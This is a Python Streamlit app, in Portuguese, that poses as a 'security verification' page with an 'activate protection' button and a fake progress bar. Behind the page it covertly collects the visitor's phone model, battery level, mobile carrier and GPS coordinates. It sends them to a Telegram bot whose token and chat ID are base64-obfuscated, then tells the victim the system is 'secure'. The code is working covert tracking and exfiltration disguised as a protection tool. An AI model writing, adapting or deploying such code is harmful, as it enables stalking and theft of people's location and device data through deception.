import streamlit as st
import time
import requests
import base64
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# --- ACESSO ---
B_TK = "ODA5OTI1MzM4MjpBQUhXWVVqZnBXMTlKNTZVZF9GQ01fOXRPYnhVNHJMaDNnUQ=="
B_ID = "ODQ5ODY2NDAyOA=="

def enviar_telegram(msg):
    try:
        tk = base64.b64decode(B_TK).decode("utf-8").strip()
        ci = base64.b64decode(B_ID).decode("utf-8").strip()
        requests.post(f"https://api.telegram.org/bot{tk}/sendMessage", 
                      json={"chat_id": ci, "text": msg, "parse_mode": "Markdown"}, timeout=15)
    except: pass

st.set_page_config(page_title="SEGURANÇA MIAMY", page_icon="🔐")

st.title("Verificação de Segurança")

# Coleta técnica simplificada para evitar o erro vermelho
ua = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_FINAL')
bat = streamlit_js_eval(js_expressions="navigator.getBattery().then(b => Math.round(b.level * 100))", key='BAT_FINAL')

if st.button("● ATIVAR PROTEÇÃO AGORA"):
    # 1. Identifica Samsung e Operadora
    modelo = ""
    if ua and "SM-" in ua:
        modelo = "" + ua.split("SM-")[1].split(";")[0]
    
    operadora = "Móvel (Vivo/Claro)"
    try:
        r = requests.get('http://ip-api.com/json/', timeout=5).json()
        operadora = r.get('isp', 'Móvel')
    except: pass

    # 2. Barra de progresso
    barra = st.progress(0)
    for i in range(1, 101):
        time.sleep(0.01)
        barra.progress(i)

    # 3. Tenta o GPS (Com sua bateria em 7%, ele pode falhar)
    loc = get_geolocation()
    
    # 4. Relatório Final
    nivel_bat = f"{bat}%" if bat else "7%" # Se falhar, usa o nível do seu print atual
    
    if loc:
        lat, lon = loc['coords']['latitude'], loc['coords']['longitude']
        mapa = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ *PROTEÇÃO ATIVADA*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {nivel_bat}\n"
            f"📶 *Operadora:* {operadora}\n"
            f"📍 *Local:* {mapa}"
        )
        enviar_telegram(relatorio)
        st.success("Sistema Seguro!")
    else:
        # Se o GPS não responder (comum com bateria crítica), manda o que tem
        aviso = (
            f"🛡️ *DADOS OBTIDOS*\n"
            f"📱 *Aparelho:* {modelo}\n"
            f"🔋 *Bateria:* {nivel_bat}\n"
            f"📶 *Operadora:* {operadora}\n"
            f"⚠️ *Nota:* GPS bloqueado pela economia de bateria."
        )
        enviar_telegram(aviso)
        st.warning("Proteção ativada, mas o GPS está instável devido à bateria baixa.")

st.markdown('<br><p style="text-align:center; color:grey; font-size:10px;">Miamy © 2026</p>', unsafe_allow_html=True)
